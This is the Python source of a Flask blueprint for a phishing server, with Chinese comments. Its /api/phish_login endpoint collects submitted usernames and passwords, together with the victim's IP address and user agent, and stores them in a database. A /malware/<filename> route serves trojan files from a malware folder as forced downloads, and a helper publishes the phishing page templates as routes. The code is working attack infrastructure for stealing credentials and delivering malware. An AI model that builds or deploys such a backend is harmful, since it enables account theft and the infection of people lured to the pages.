import glob
from flask import abort, Blueprint, request, jsonify, render_template, send_from_directory
from app.models.creds_model import db, Credential
import os

phish_bp = Blueprint('phish', __name__, url_prefix='')

MALWARE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../malware'))

# 极简钓鱼API：接收JSON账号密码，保存到数据库
@phish_bp.route('/api/phish_login', methods=['POST'])
def api_phish_login():
    data = request.get_json(force=True)
    username = data.get('username')
    password = data.get('password')
    scene = data.get('scene')
    user_agent = data.get('user_agent') or request.headers.get('User-Agent')
    extra_info = data.get('extra_info')
    ip = request.remote_addr
    # print(f"[DEBUG] 捕获账号: {username} 密码: {password} IP: {ip} 场景: {scene}")
    if username and password:
        cred = Credential(
            username=username,
            ip=ip,
            scene=scene,
            user_agent=user_agent,
            extra_info=extra_info
        )
        cred.set_password(password)
        db.session.add(cred)
        db.session.commit()
    # print(f"[DEBUG] 已写入数据库: {username}")
        return jsonify({'success': True})
    # print("[DEBUG] 参数缺失，未写入数据库")
    return jsonify({'success': False, 'msg': '参数缺失'})

# 直接下载木马文件，无页面交互
@phish_bp.route('/malware/<filename>', methods=['GET'])
def download_malware(filename):
    # 可加白名单或日志
    return send_from_directory(MALWARE_DIR, filename, as_attachment=True)

# 自动注册所有模板页面路由
def register_template_routes(bp, template_dir):
    # 获取已注册endpoint，避免重复和冲突
    registered_endpoints = set()
    # Flask注册endpoint格式为: 蓝图名.函数名
    for attr in dir(bp):
        if not attr.startswith('_'):
            registered_endpoints.add(f"{bp.name}.{attr}")
    # 明确加上已知的API和malware endpoint
    registered_endpoints.add('phish.api_phish_login')
    registered_endpoints.add('phish.download_malware')
    for template_path in glob.glob(os.path.join(template_dir, '*.html')):
        template_name = os.path.basename(template_path)
        route_name = '/' + os.path.splitext(template_name)[0]
        endpoint_func_name = os.path.splitext(template_name)[0]
        endpoint = f"phish_template_{endpoint_func_name}"
        if endpoint in registered_endpoints:
            continue
        def make_view_func(template_name):
            def view_func():
                try:
                    # 支持GET参数透传到模板
                    return render_template(template_name, **request.args)
                except Exception as e:
                    import traceback
                    err_msg = f"<h2>模板渲染异常: {template_name}</h2><pre>{traceback.format_exc()}</pre>"
                    return err_msg, 500
            return view_func
        bp.add_url_rule(route_name, endpoint=endpoint, view_func=make_view_func(template_name), methods=['GET'])

# 确保自动注册所有模板页面路由
register_template_routes(phish_bp, os.path.join(os.path.dirname(__file__), '../templates'))

